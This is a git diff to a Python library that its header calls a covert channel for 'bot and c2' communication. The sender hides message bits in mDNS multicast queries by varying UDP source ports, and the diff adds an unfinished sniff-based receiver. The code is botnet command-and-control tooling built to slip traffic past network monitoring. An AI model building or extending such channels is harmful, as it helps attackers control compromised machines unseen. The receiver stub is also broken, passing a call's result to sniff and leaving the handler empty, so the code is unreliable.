@@ -1,13 +1,18 @@
 #!/usr/bin/python3
 # Covert Channel Communication Library for bot and c2 to use
+import logging
+import threading
 import bitarray
 from scapy import packet
 from scapy.arch import get_if_addr
 from scapy.config import conf
 from scapy.layers.dns import DNS
 from scapy.layers.inet import IP, UDP
-from scapy.sendrecv import send
+from scapy.packet import Packet
+from scapy.sendrecv import send, sniff
 import time
+
+logging.basicConfig(level=logging.DEBUG)
 
 
 def mkpkt(srcprt: int, qclass: int) -> packet.Packet:
@@ -22,12 +27,9 @@ def mkpkt(srcprt: int, qclass: int) -> packet.Packet:
     return IP(src=myip, dst="224.0.0.251") / UDP(sport=srcprt, dport="mdns") / query
 
 
-def calcsum(inp: str):
+def calcsum(bits: bitarray):
     """Incredibly stupid checksum function but it should work"""
-    bits = bitarray.bitarray()
     output = bitarray.bitarray()
-    # Convert string into bits
-    bits.frombytes(bytes(inp, "utf8"))
     counter = 0
     for i in bits:
         if counter == 0:
@@ -45,8 +47,9 @@ def calcsum(inp: str):
 
 class Message:
     def __init__(self, string: str):
-        self.bytes = bytes(string, "utf8")
-        self.checksum = calcsum(string)
+        self.bitlist = bitarray.bitarray()
+        self.bitlist.frombytes(bytes(string, "utf8"))
+        self.checksum = calcsum(self.bitlist)
         self.base_port = 5350
 
     def preamble(self):
@@ -87,19 +90,47 @@ class Message:
 
     def send(self):
         self.preamble()
-        while len(self.bytes) != 0:
+        while len(self.bitlist) != 0:
             # Wait 1/4 second for next frame (synchronized by preamble)
             time.sleep(0.25)
             for i in range(0, 8):
                 try:
-                    payload = self.bytes.pop(0)
+                    payload = self.bitlist.pop(0)
                 except IndexError:  # shouldn't ever happen since we converted from bytes
                     break
                 # Don't transmit packet if payload is 0
                 if payload == 0:
                     continue
-                p = mkpkt(self.base_port+i, 1)
+                p = mkpkt(self.base_port + i, 1)
                 send(p)
+            logging.debug("Successfully send frame")
         self.postabmle()
-        print("Done transmitting!")
+        logging.info("Done transmitting!")
 
+
+class Frame:
+    def __init__(self):
+        self.payload = bitarray.bitarray()
+        self.payload.extend([0, 0, 0, 0, 0, 0, 0, 0])
+        self.when = time.time()
+
+
+class Stream:
+    def __init__(self):
+        self.frames: list[Frame]
+        self.frames = []
+
+
+class Receiver:
+    def __init__(self):
+        self.messages = []
+        self.tlock = threading.Lock()
+        self.base_port = 5350
+
+    def packethandler(self, pkt: Packet):
+        pass
+
+    def start(self):
+        """Initiate packet sniffing, should be launched in its own thread"""
+        sniff(prn=self.packethandler())
+        logging.warning("Communication Sniffer exited!")
